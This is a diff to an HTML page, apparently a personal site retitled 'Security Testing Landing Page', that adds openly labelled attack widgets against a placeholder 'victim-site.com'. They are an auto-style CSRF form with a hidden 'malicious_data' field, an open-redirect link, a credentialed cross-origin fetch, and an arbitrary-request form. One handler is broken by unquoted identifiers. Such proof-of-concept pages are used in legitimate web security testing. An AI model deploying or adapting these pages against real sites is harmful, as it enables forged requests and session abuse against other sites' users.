@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Super Guy Site</title>
+  <title>Security Testing Landing Page</title>
   <link rel="stylesheet" href="styles.css">
   <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet">
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
@@ -11,8 +11,69 @@
 <body>
   <h1>#1 Super Guy</h1>
   <div id="tooling">
-    <p>tools and testing.</p>
+    <h2>CSRF Test</h2>
+    <form action="https://victim-site.com/endpoint" method="POST">
+      <input type="hidden" name="data" value="malicious_data">
+      <button type="submit">Submit CSRF Request</button>
+    </form>
+
+    <h2>Open Redirect Test</h2>
+    <a href="https://victim-site.com/redirect?url=https://your-site.github.io">Test Open Redirect</a>
+
+    <h2>JavaScript Request Test</h2>
+    <button id="test-request-btn">Send Test Request</button>
+    <script>
+      document.getElementById(test-request-btn).addEventListener(click, function() {
+        fetch("https://victim-site.com/api", {
+          method: "GET",
+          credentials: "include"
+        })
+        .then(response => response.text())
+        .then(data => {
+          console.log("Response:", data);
+        })
+        .catch(error => {
+          console.error("Error:", error);
+        });
+      });
+    </script>
+
+    <h2>Send Arbitrary Request</h2>
+    <form id="arbitrary-request-form">
+      <label for="url">URL:</label>
+      <input type="text" id="url" name="url" placeholder="https://victim-site.com"><br><br>
+      <label for="method">Method:</label>
+      <select id="method" name="method">
+        <option value="GET">GET</option>
+        <option value="POST">POST</option>
+      </select><br><br>
+      <label for="data">Data (for POST):</label>
+      <input type="text" id="data" name="data"><br><br>
+      <button type="submit">Send Request</button>
+    </form>
+    <script>
+      document.getElementById("arbitrary-request-form").addEventListener("submit", function(event) {
+        event.preventDefault();
+        const url = document.getElementById("url").value;
+        const method = document.getElementById("method").value;
+        const data = document.getElementById("data").value;
+
+        fetch(url, {
+          method: method,
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          body: method === "POST" ? data : null
+        })
+        .then(response => response.text())
+        .then(data => {
+          console.log("Response:", data);
+        })
+        .catch(error => {
+          console.error("Error:", error);
+        });
+      });
+    </script>
   </div>
-  <script src="scripts.js"></script>
 </body>
 </html>
